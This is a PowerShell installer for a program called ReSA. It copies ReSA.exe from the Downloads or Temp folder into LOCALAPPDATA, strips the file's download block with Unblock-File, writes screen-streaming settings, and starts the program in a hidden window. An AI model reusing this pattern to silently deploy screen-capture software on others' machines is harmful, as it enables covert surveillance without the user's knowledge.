# Install ReSA from a local ReSA.exe (skip download)
# Usage: put ReSA.exe in Downloads folder, then run this script
param(
    [string]$SourceExe = ""
)

$ErrorActionPreference = "Continue"
$Dir = Join-Path $env:LOCALAPPDATA "ReSA"
$Exe = Join-Path $Dir "ReSA.exe"

if (-not $SourceExe) {
    $candidates = @(
        (Join-Path $env:USERPROFILE "Downloads\ReSA.exe"),
        (Join-Path $env:TEMP "ReSA.exe"),
        (Join-Path $env:TEMP "ReSA-download.exe")
    )
    foreach ($c in $candidates) {
        if ((Test-Path -LiteralPath $c) -and ((Get-Item -LiteralPath $c).Length -gt 1048576)) {
            $SourceExe = $c
            break
        }
    }
}

if (-not $SourceExe -or -not (Test-Path -LiteralPath $SourceExe)) {
    Write-Host "ReSA.exe not found. Download first:" -ForegroundColor Red
    Write-Host "  https://olxp.cc/download/ReSA.exe"
    Write-Host "Save to Downloads\ReSA.exe then run this script again."
    Read-Host "Press Enter"
    exit 1
}

$size = (Get-Item -LiteralPath $SourceExe).Length
Write-Host ("Found: " + $SourceExe + " (" + $size + " bytes)")

New-Item -ItemType Directory -Force -Path $Dir | Out-Null
Get-Process -Name "ReSA" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 1

Copy-Item -LiteralPath $SourceExe -Destination $Exe -Force
Unblock-File -LiteralPath $Exe -ErrorAction SilentlyContinue

$json = @'
{
  "streamWidth": 1024,
  "fps": 8,
  "quality": 45
}
'@.Trim()
[IO.File]::WriteAllText((Join-Path $Dir "settings.json"), $json, (New-Object System.Text.UTF8Encoding $false))

Start-Process -FilePath $Exe -WorkingDirectory $Dir -WindowStyle Hidden
Write-Host "ReSA installed and started." -ForegroundColor Green
Start-Sleep -Seconds 2
